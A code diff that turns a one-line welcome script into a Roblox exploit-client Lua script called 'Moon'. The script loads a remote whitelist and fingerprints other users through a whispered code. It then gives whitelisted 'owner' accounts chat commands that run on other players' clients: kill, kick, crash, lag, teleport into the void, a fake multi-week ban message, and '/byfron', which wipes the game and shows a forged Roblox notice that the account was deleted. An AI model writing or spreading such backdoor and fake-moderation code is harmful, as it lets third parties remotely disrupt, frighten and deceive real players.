@@ -1,1 +1,267 @@
-print("Welcome To Moon!")
+local lplr = game.Players.LocalPlayer
+local txt = game:GetService("TextChatService")
+
+local function jsonDecode(a)
+	return game:GetService("HttpService"):JSONDecode(a)
+end
+
+local whitelist = jsonDecode(game:HttpGet("https://raw.githubusercontent.com/Damcpros/MoonConfig-4.0/main/data.json"))
+
+local function getLplrType()
+	local lplr_Type = 0
+	if whitelist["Owner"] ~= nil then
+		for i,v in pairs(whitelist["Owner"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 2
+				return lplr_Type
+			end
+		end
+	end
+	if whitelist["Private"] ~= nil then
+		for i,v in pairs(whitelist["Private"]) do
+			if v.id == tostring(lplr.UserId) then
+				lplr_Type = 1
+				return lplr_Type
+			end
+		end
+	end
+	return lplr_Type
+end
+
+local MoonUsers = {}
+
+function CanAttackUser(u)
+	local userId = tostring(u.UserId)
+	local userType = 0
+
+	if whitelist["Private"] ~= nil then
+		for i, v in pairs(whitelist["Private"]) do
+			if v.id == userId then
+				userType = 1
+				break
+			end
+		end
+	end
+
+	if whitelist["Owner"] ~= nil then
+		for i, v in pairs(whitelist["Owner"]) do
+			if v.id == userId then
+				userType = 2
+				break
+			end
+		end
+	end
+
+	return getLplrType() >= userType
+end
+
+local function privateMemberInMatch()
+	for i, v in pairs(game.Players:GetPlayers()) do
+		if not CanAttackUser(v) then
+			return true
+		end
+	end
+	return false
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if not CanAttackUser(plr) then
+		local newchannel = txt.ChatInputBarConfiguration.TargetTextChannel
+		local targetChannel = game:GetService("ReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
+		targetChannel:SendAsync("/w " .. plr.Name .. " AUIWhjd")
+		newchannel:SendAsync(" ")
+		table.insert(MoonUsers, plr)
+	end
+end)
+
+txt.OnIncomingMessage = function(msg)
+	local p = Instance.new("TextChatMessageProperties")
+	local message = msg
+	if msg.TextSource then
+		userId = tostring(msg.TextSource.UserId)
+		p.PrefixText = msg.PrefixText
+		print(message.Text,":",userId)
+
+		local userType = 0
+		local hasTag = false
+		local colors = {
+			["red"] = "#ff0000",
+			["orange"] = "#ff7800",
+			["yellow"] = "#e5ff00",
+			["green"] = "#00ff00",
+			["blue"] = "#0000ff",
+			["purple"] = "#b800b8",
+			["pink"] = "#ff00ff",
+			["black"] = "#000000",
+			["white"] = "#ffffff",
+		}
+		if whitelist["tags"] ~= nil then
+			for i, v in pairs(whitelist["tags"]) do
+				if v.userid == userId then
+
+					hasTag = true
+					local color = colors[v.color] or colors["pink"]
+					p.PrefixText = "<font color='" .. color .. "'>[" .. v.tag .. "]</font> " .. p.PrefixText
+				end
+			end
+		end
+
+		if whitelist["Private"] ~= nil then
+			for i, v in pairs(whitelist["Private"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='#ff00ff'>[Moon Private]</font> " .. msg.PrefixText
+					end
+					userType = 1
+				end
+			end
+		end
+
+		if table.find(MoonUsers, game.Players:GetPlayerByUserId(userId)) then
+			if not hasTag then
+				p.PrefixText = "<font color='#"..colors.yellow.."'>[Moon User]</font> " .. msg.PrefixText
+			end
+		end
+
+		if whitelist["Owner"] ~= nil then
+			for i, v in pairs(whitelist["Owner"]) do
+				if v.id == userId then
+					if not hasTag then
+						hasTag = true
+						p.PrefixText = "<font color='#"..tostring(Color3.fromRGB(177,0,255):ToHex()).."'>[VAPE PRIVATE]</font> " .. msg.PrefixText
+					end
+					userType = 2
+				end
+			end
+		end
+	end
+	if not CanAttackUser(game.Players:GetPlayerByUserId(userId)) then
+		if message.Text == "/kill" then
+			lplr.Character.Humanoid.Health = 0
+		elseif message.Text == "/kick" then
+			lplr:Kick()
+		elseif message.Text == "/teleport" then
+			game:GetService("TeleportService"):Teleport(game.PlaceId)
+		elseif message.Text == "/rickroll" then
+			transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
+		elseif message.Text == "/void" then
+			lplr.Character.PrimaryPart.CFrame -= Vector3.new(0,1000,0)
+		elseif message.Text == "/crash" then
+			while true do print() end
+		elseif message.Text == "/lagback" then
+			lplr.Character.PrimaryPart.CFrame += Vector3.new(457635,1000,6745674567)
+		elseif message.Text == "/ban" then
+			task.spawn(function()
+				lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+			end)
+		elseif message.Text == "/mrboney" then
+			transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
+		elseif message.Text == "/byfron" then
+			task.spawn(function()
+				local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+				local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+				UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+				local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+				local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+				local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				game:GetService("CoreGui"):ClearAllChildren()
+				for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+				task.wait(0.2)
+				lplr:Kick()
+				game:GetService("GuiService"):ClearError()
+				task.wait(2)
+				local gui = Instance.new("ScreenGui")
+				gui.IgnoreGuiInset = true
+				gui.Parent = game:GetService("CoreGui")
+				local frame = Instance.new("Frame")
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.new(1, 0, 1, 0)
+				frame.BackgroundColor3 = Color3.new(1, 1, 1)
+				frame.Parent = gui
+				task.delay(0.1, function()
+					frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+				end)
+				task.delay(2, function()
+					local e = Roact.createElement(auth, {
+						style = {},
+						screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = "Delete",
+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {},
+							messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+						},
+						termsActivated = function() 
+							game:Shutdown()
+						end,
+						communityGuidelinesActivated = function() 
+							game:Shutdown()
+						end,
+						supportFormActivated = function() 
+							game:Shutdown()
+						end,
+						reactivateAccountActivated = function() 
+							game:Shutdown()
+						end,
+						logoutCallback = function()
+							game:Shutdown()
+						end,
+						globalGuiInset = {
+							top = 0
+						}
+					})
+					local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+						localization = tLocalization.mock()
+					}, {Roact.createElement(UIBlox.Style.Provider, {
+						style = {
+							Theme = darktheme,
+							Font = gotham
+						},
+					}, {e})}))
+					Roact.mount(screengui, game:GetService("CoreGui"))
+				end)
+			end)
+		elseif message.Text == "/lag" then
+			task.spawn(function()
+				while true do
+					task.wait()
+					for i = 1,60 do
+						Instance.new("Part",workspace)
+					end
+					if setfpscap then
+						setfpscap(12)
+					end
+				end
+			end)
+		elseif message.Text == "/monkey" then
+			local str = "Imagine getting trolled by a moon dev"
+			if str == "" then str = "skill issue" end
+			local textlab = Instance.new("TextLabel")
+			textlab.TextSize = 45
+			textlab.ZIndex = 10
+			textlab.Size = UDim2.new(1, 0, 1, 36)
+			textlab.TextColor3 = Color3.new(1, 1, 1)
+			textlab.Text = str
+			textlab.Position = UDim2.new(0, 0, 0, -36)
+			textlab.Font = Enum.Font.Gotham
+			textlab.BackgroundTransparency = 1
+			textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+			task.wait(19)
+			task.spawn(function()
+				pcall(function()
+					if getconnections then
+						getconnections(lplr.Character.Humanoid.Died)
+					end
+					print(game:GetObjects("h29g3535")[1])
+				end)
+				while true do end
+			end)
+		end
+	end
+	return p
+end
